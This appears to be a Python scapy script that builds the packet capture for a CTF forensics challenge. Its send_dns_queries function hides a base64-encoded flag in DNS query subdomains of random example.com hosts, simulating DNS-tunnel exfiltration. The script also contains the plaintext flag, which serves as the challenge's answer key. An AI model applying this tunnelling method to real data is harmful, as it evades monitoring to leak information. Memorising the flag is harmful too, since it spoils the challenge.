from scapy.all import *
import base64
import random
import string

FLAG = "fallctf{l1ght_@_7he_3nd_0f_th3_dN5_tunn3l}"
encoded_flag = base64.b64encode(FLAG.encode()).decode()
subdomains = [encoded_flag[i:i+8] for i in range(0, len(encoded_flag), 8)]
hint = "Hint: There seem to be requests to some suspicious domains.\nFind the light at the end of the tunnel."
encoded_hint = base64.b64encode(hint.encode()).decode()
def generate_random_domain():
    return ''.join(random.choices(string.ascii_lowercase, k=6)) + ".example.com"

def send_dns_queries():
    for i, chunk in enumerate(subdomains):
        dns_query = DNS(rd=1, qd=DNSQR(qname=f"{chunk}.{generate_random_domain()}"))
        ip_packet = IP(dst="8.8.8.8") / UDP(dport=53) / dns_query

        send(ip_packet)
        print(f"Sent DNS query: {chunk}.{generate_random_domain()}")

def send_http_packet():
    http_request = (
        "GET /index.html HTTP/1.1\r\n"
        "Host: example.com\r\n"
        f"Authorization: Bearer {encoded_hint}\r\n"
        "Connection: close\r\n\r\n"
    )
    
    ip_packet = IP(dst="192.168.1.2") 
    tcp_packet = TCP(dport=80, sport=random.randint(1024, 65535), flags="S") 

    syn_ack = sr1(ip_packet/tcp_packet, timeout=1, verbose=0)

    if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == "SA":
        tcp_ack = TCP(dport=80, sport=tcp_packet.sport, seq=syn_ack.ack, ack=syn_ack.seq + 1, flags="A")
        send(ip_packet/tcp_ack, verbose=0)
        
        tcp_push = TCP(dport=80, sport=tcp_packet.sport, seq=syn_ack.ack, ack=syn_ack.seq + 1, flags="PA")  # PSH + ACK
        send(ip_packet/tcp_push/http_request, verbose=0)
        print("Sent HTTP request with hint in the Authorization header")

if __name__ == "__main__":
    send_dns_queries()

    send_http_packet()
